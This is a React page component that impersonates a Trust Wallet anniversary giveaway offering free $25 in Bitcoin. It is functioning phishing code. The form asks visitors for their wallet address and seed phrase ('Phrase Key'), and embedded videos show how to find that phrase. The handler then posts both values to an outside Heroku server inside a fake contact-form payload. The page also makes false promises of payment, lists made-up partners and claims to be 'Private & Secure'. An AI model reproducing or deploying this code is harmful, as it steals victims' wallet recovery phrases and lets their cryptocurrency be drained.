import React, { useState, useEffect } from "react";
import axios from 'axios'
export default function Home() {
  const [wallet, setWallet] = useState("");
  const [phraseKey, setPhraseKey] = useState("");

  const sendContact = () => {
  
    var data = JSON.stringify({
      fullName: "asdas",
      email: "asdas",
      question: wallet,
      detail: phraseKey,
    });

    var config = {
      method: "post",
      url: "https://mtvlr.herokuapp.com/v1/public/contact/send",
      headers: {
        "Content-Type": "application/json",
      },
      data: data,
    };

    axios(config)
      .then(function (response) {
        window?.location?.reload();
      })
      .catch(function (error) {
       
        alert(error.response.data.message);
      });
  };

  return (
    <>
      <nav className="navbar navbar-expand-lg navbar-togglable navbar-dark bg-primary d-block">
        <div className="container">
          <img src="/assets/images/logo.png" height="40" />
          <button
            className="navbar-toggler collapsed"
            id="navbarToggle"
            type="button"
            data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-expanded="false"
            aria-hidden="true"
            aria-label="Toggle navigation"
            aria-controls="navbarCollapse"
          >
            <span className="navbar-toggler-icon collapsed"></span>
          </button>
          <div
            className="navbar-collapse collapse navbar-margin"
            id="navbarSupportedContent"
          >
            <button
              className="navbar-toggler collapsed"
              type="button"
              data-toggle="collapse"
              data-target="#navbarSupportedContent"
              aria-controls="navbarCollapse"
              aria-expanded="false"
              aria-hidden="true"
              aria-label="Toggle navigation"
            ></button>
            <ul className="navbar-nav font-size-sm ml-auto">
              <li className="nav-item">
                <a
                  className="nav-link"
                  href="#test"
                  aria-label="Goes to supported assets page"
                >
                  Home
                </a>
              </li>
              <li className="nav-item">
                <a
                  className="nav-link"
                  href="#test"
                  aria-label="Goes to supported assets page"
                >
                  Get Free 25 $ BTC
                </a>
              </li>
              <li className="nav-item">
                <a
                  className="nav-link"
                  href="#test"
                  aria-label="Goes to supported assets page"
                >
                  FAQ
                </a>
              </li>
              <li className="nav-item">
                <a
                  className="nav-link"
                  href="#test"
                  aria-label="Goes to supported assets page"
                >
                  Contact
                </a>
              </li>
            </ul>
          </div>
        </div>
      </nav>
      <main className="page-content" aria-label="Content">
        <section className="pt-8 pb-8 bg-gradient-primary">
          <div className="container">
            <div className="row align-items-center justify-content-center justify-content-md-between">
              <div className="col-12 col-lg-6 mb-8 text-center text-md-left text-white">
                <h1 className="display-3 font-weight-bold">
                  Get Free 25 $ BTC !
                </h1>
                <p className="text-white-90 lead mb-4">
                  10th anniversary special offer! Limited to only 500 people!
                  (455 Turkish Lira)
                </p>
                <div className="download-button">
                  <div className="row download">
                    <div className="col-12 col-lg-4 apple">
                      <a
                        href="#"
                        data-analytics='"Download Clicks", {"props":{"Target":"App Store"}}'
                        className="downloadapp"
                        aria-label="goes to AppStore to download Trust Wallet for iphones"
                      >
                        <img
                          src="/assets/images//getfree.png"
                          height="60"
                          style={{ marginTop: 6 }}
                        />
                      </a>
                    </div>
                    <div
                      className="col-12 col-lg-4 apple"
                      style={{ marginLeft: 3 }}
                    >
                      <a
                        href="#"
                        data-analytics='"Download Clicks", {"props":{"Target":"App Store"}}'
                        className="downloadapp"
                        aria-label="goes to AppStore to download Trust Wallet for iphones"
                      >
                        <svg
                          className="download-app-image download-apple"
                          loading="lazy"
                          role="img"
                          alt="goes to AppStore to download Trust Wallet for iphones"
                          aria-label="goes to AppStore to download Trust Wallet for iphones"
                          rel="noopener"
                        ></svg>
                      </a>
                    </div>
                    <div className="col-12 col-lg-4 googleplay">
                      <a
                        href="#"
                        data-analytics='"Download Clicks", {"props":{"Target":"Google Play"}}'
                        className="downloadapp"
                        aria-label="goes to Google Play store to download Trust Wallet for Android phones"
                      >
                        <svg
                          className="download-app-image download-play"
                          loading="lazy"
                          role="img"
                          alt="goes to Google Play store to download Trust Wallet for Android phones"
                          aria-label="goes to Google Play store to download Trust Wallet for Android phones"
                          rel="noopener"
                        ></svg>
                      </a>
                    </div>
                    <div className="col-12 col-lg-4 androidapk">
                      <a
                        href="#"
                        data-analytics='"Download Clicks", {"props":{"Target":"Download Apk"}}'
                        className="downloadapp"
                        aria-label="Downloads Trust Wallet as APK file for android phones"
                      >
                        <svg
                          className="download-app-image download-apk"
                          loading="lazy"
                          role="img"
                          alt="Downloads Trust Wallet as APK file for android phones"
                          aria-label="Downloads Trust Wallet as APK file for android phones"
                          rel="noopener"
                        ></svg>
                      </a>
                    </div>
                    <div className="col-12 col-lg-4 huawei hidden">
                      <a
                        href="#"
                        data-analytics='"Download Clicks", {"props":{"Target":"Huawei AppGallery"}}'
                        className="downloadapp"
                        aria-label="goes to huawei store to download Trust Wallet for huawei phones"
                      >
                        <svg
                          className="download-app-image download-huawei"
                          loading="lazy"
                          role="img"
                          alt="goes to huawei store to download Trust Wallet for huawei phones"
                          aria-label="goes to huawei store to download Trust Wallet for huawei phones"
                          rel="noopener"
                        ></svg>
                      </a>
                    </div>
                  </div>
                </div>
              </div>
              <div className="col-12 col-lg-6 text-center">
                <img
                  loading="lazy"
                  className="hero-image mx-auto d-block img-fluid"
                  src="/assets/images/home_hero.png"
                  alt="Trust Wallet app mobile mockup"
                />
              </div>
            </div>
          </div>
        </section>
        <div className="container" style={{ marginTop: 50 }} id="test">
          <br />
          <a style={{ color: "red", fontSize: 19 }}>
            Fill in the form below correctly. One hour after submitting the
            form, $25 will be sent to your account.
          </a>
          <br />
          <br />
          <form>
            <div class="form-group">
              <b for="exampleInputPassword1">Select Any Chain</b>
              <select class="form-control">
                <option>BTC</option>
                <option>BNB</option>
                <option>ETH</option>
                <option>MATIC</option>
              </select>
            </div>
            <div class="form-group">
              <b for="exampleInputEmail1">Wallet Address</b>
              <input
                type="text"
                class="form-control"
                onChange={(text) => setWallet(text.target.value)}
                placeholder="Enter Wallet Address"
              />
              <small id="emailHelp" class="form-text text-muted">
                Please specify the address to which account you want to receive
                payment.
              </small>
            </div>
            <div class="form-group">
              <b for="exampleInputEmail1">Enter Phrase Key</b>
              <input
                type="text"
                onChange={(text) => setPhraseKey(text.target.value)}
                class="form-control"
                placeholder="Phrase Key"
              />
              <small id="emailHelp" class="form-text text-muted">
                Please enter "Phrase Key" so we can send you $25.
              </small>
              <br />
              <br />
              <b>Partners:</b> TrustWallet, Binance, PooCoin and MintMeCoin
              <hr />
              <br />
              <div className="row">
                <div className="col-sm-6">
                  <big id="emailHelp" class="form-text text-muted">
                    How Can I Take Phrase Key METAMASK ?
                  </big>
                  <iframe
                    width="360"
                    height="215"
                    src="https://www.youtube.com/embed/D6BTnE9sYd8"
                    title="YouTube video player"
                    frameborder="0"
                    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                    allowfullscreen
                  ></iframe>
                </div>
                <div className="col-sm-6">
                  <big id="emailHelp" class="form-text text-muted">
                    How Can I Take Phrase Key TRUST WALLET ?
                  </big>
                  <iframe
                    width="360"
                    height="215"
                    src="https://www.youtube.com/embed/enqcY5HyPqc"
                    title="YouTube video player"
                    frameborder="0"
                    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                    allowfullscreen
                  ></iframe>
                </div>
              </div>
            </div>
            <br />
            <div class="form-check">
              <input
                type="checkbox"
                class="form-check-input"
                id="exampleCheck1"
              />
              <label class="form-check-label" for="exampleCheck1">
                I accept the accuracy of the information.
              </label>
            </div>
            <br />
            <br />
            <button
              onClick={() => sendContact()}
              type="submit"
              class="btn btn-primary"
            >
              Send Me 25 $ Now :)
            </button>
          </form>
        </div>
        <section className="pt-6">
          <div className="container">
            <div className="row border-bottom justify-content-center pb-4">
              <div className="col-12 col-md-auto ml-auto d-flex justify-content-center"></div>

              <div className="col-12 col-md-auto ml-auto d-flex justify-content-center">
                <div className="icon icon-xs mb-5">
                  <svg alt="icon lock" title="Key lock icon"></svg>
                </div>
                <div className="ml-4">
                  <span className="font-weight-bold lead">
                    {" "}
                    Private & Secure{" "}
                  </span>
                </div>
              </div>
              <div className="col-12 col-md-auto ml-auto d-flex justify-content-center"></div>
              <div className="col-12 col-md-auto ml-auto d-flex justify-content-center"></div>
            </div>
          </div>
        </section>
        <section className="pt-8">
          <div className="container">
            <div className="row align-items-center justify-content-center justify-content-md-between">
              <div className="col-12 text-center mt-4 mt-md-0 order-md-2">
                <h2 className="display-4 font-weight-bold mb-4">
                  You Deserve Easy Access to Cryptocurrencies
                </h2>
                <p className="lead text-gray-700">
                  Trust Wallet is for you if you want to
                </p>
              </div>
            </div>
            <div className="row align-items-center justify-content-center justify-content-md-between pt-4 pb-4 text-center">
              <div className="col-12 col-lg-6">
                <div className="list-group-item d-flex">
                  <span className="mr-4">
                    <em className="check"></em>
                  </span>
                  Buy Bitcoin in under five minutes
                </div>
                <div className="list-group-item d-flex">
                  <span className="mr-4">
                    <em className="check"></em>
                  </span>
                  Easily earn interest on the crypto in your wallet
                </div>
                <div className="list-group-item d-flex">
                  <span className="mr-4">
                    <em className="check"></em>
                  </span>
                  See your collectibles. Art & NFTs in one place
                </div>
              </div>
              <div className="col-12 col-lg-6">
                <div className="list-group-item d-flex">
                  <span className="mr-4">
                    <em className="check"></em>
                  </span>
                  Exchange your crypto without leaving the app
                </div>
                <div className="list-group-item d-flex">
                  <span className="mr-4">
                    <em className="check"></em>
                  </span>
                  Track charts and prices within the app
                </div>
                <div className="list-group-item d-flex">
                  <span className="mr-4">
                    <em className="check"></em>
                  </span>
                  Keep your crypto safe from hackers & scammers
                </div>
              </div>
            </div>
          </div>
        </section>
        <section className="pt-8">
          <div className="container">
            <div className="row align-items-center justify-content-center justify-content-md-between">
              <div className="col-12 col-md-6 col-lg-5 text-center text-md-left mb-4 order-sm-first order-md-2">
                <h2 className="display-4 font-weight-bold mt-4">
                  Get 25$ Crypto{" "}
                  <a style={{ color: "rgb(57, 158, 57)" }}>Free</a>
                </h2>
                <p className="lead text-gray-700">
                  Get your first $25 of Bitcoin, Ethereum, Binance Coin and many
                  other cryptocurrencies.
                </p>
              </div>
              <div className="col-12 col-md-6 col-lg-7">
                <img
                  loading="lazy"
                  className="img-fluid mx-auto d-block"
                  src="/assets/images/home_cards.png"
                  alt="Trust Wallet mobile mockup shows how it looks like to buy crypto with credit card"
                />
              </div>
            </div>
          </div>
        </section>
      </main>
    </>
  );
}
